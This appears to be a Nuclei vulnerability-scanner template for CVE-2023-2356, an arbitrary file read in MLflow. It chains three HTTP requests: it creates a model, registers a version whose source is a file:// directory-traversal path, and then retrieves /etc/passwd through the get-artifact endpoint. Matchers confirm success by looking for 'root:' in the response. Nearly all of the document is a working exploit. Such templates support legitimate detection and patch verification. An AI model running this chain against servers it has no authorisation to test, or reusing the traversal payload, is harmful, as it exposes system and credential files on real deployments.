id: cve-2023-2356-mlflow-anyfile-read
info:
  name: MLflow Arbitrary File Read Vulnerability (CVE-2023-2356)
  author: ProjectDiscoveryAI
  severity: critical
  tags: cve-2023-2356,arbitrary-file-read,directory-traversal

variables:
  t1: "{{rand_base(5)}}"

flow: http(1) && http(2) && http(3)

http:
  - id: create-registered-model
    method: POST
    path:
      - "{{BaseURL}}/api/2.0/mlflow/registered-models/create"
    headers:
      Content-Type: application/json
    body: |
      {"name": "{{t1}}"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t1}}"
        part: body

  - id: create-model-version
    method: POST
    path:
      - "{{BaseURL}}/api/2.0/mlflow/model-versions/create"
    headers:
      Content-Type: application/json
    body: |
      {"name": "{{t1}}", "source": "file://{{BaseURL}}/../../../../../../../"}
    matchers:
      - type: status
        status:
          - 200

  - id: get-artifact
    method: GET
    path:
      - "{{BaseURL}}/model-versions/get-artifact?path=etc/passwd&name={{t1}}&version=1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:"
          - "/bin"
        part: body
      - type: word
        words:
          - "<"
        part: body
        negative: true
